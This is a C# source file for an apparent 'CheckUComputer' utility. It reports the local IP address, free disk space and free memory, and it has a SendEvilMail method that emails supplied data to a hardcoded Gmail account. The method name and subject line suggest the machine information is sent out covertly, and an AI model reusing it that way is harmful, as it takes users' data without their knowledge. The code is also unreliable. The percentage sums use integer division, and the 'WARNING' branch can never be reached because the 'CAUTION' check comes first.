using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace CheckUComputer
{
    class PCInformation
    {
        public string getLocalIPAddress()
        {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localIP = ip.ToString();
                }
            }
            return localIP;
        }
        public string getTotalHDDSize()
        {
            string result = "";
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.Name == @"C:\")
                {
                    double calc = (drive.TotalFreeSpace / (1024 * 1024 * 1024)) * 100 / (drive.TotalSize / (1024 * 1024 * 1024));
                    if (calc < 20)
                    {
                        result += calc + "%  CAUTION!";
                    }
                    else if (calc <= 10)
                    {
                        result += calc + "%  WARNING!!";
                    }
                    else
                    {
                        result += calc + "%  GOOD!";
                    }
                }
            }
            return result;
        }
        public string getTotalMemory()
        {
            string result = "";
            double calc = (PsApiWrapper.GetPerformanceInfo().PhysicalAvailableBytes / (1024 * 1024)) * 100 / (PsApiWrapper.GetPerformanceInfo().PhysicalTotalBytes / (1024 * 1024));
            if (calc < 20)
            {
                result = calc + "%  CAUTION!";
            }
            else if (calc <= 10)
            {
                result = calc + "%  WARNING!!";
            }
            else
            {
                result = calc + "%";
            }
            return result;
        }
        public void SendEvilMail(string data)
        {
            //Se necesita configurar el mail https://support.google.com/a/answer/176600?hl=es
            MailMessage email = new MailMessage();
            email.To.Add(new MailAddress("myemail@gmail.com"));
            email.From = new MailAddress("myemail@gmail.com");
            email.Subject = "EVILMAIL FROM MY APP ( " + DateTime.Now.ToString("dd / MMM / yyy hh:mm:ss") + " ) ";
            email.Body = data;
            email.IsBodyHtml = true;
            email.Priority = MailPriority.Normal;
            SmtpClient smtp = new SmtpClient();
            smtp.Host = "smtp.gmail.com";
            smtp.Port = 25;
            smtp.EnableSsl = true;
            smtp.UseDefaultCredentials = false;
            smtp.Credentials = new NetworkCredential("myemail@gmail.com", "mypass");
            try
            {
                smtp.Send(email);
                email.Dispose();
            }
            catch (Exception)
            {

                throw;
            }
        }
    }
}
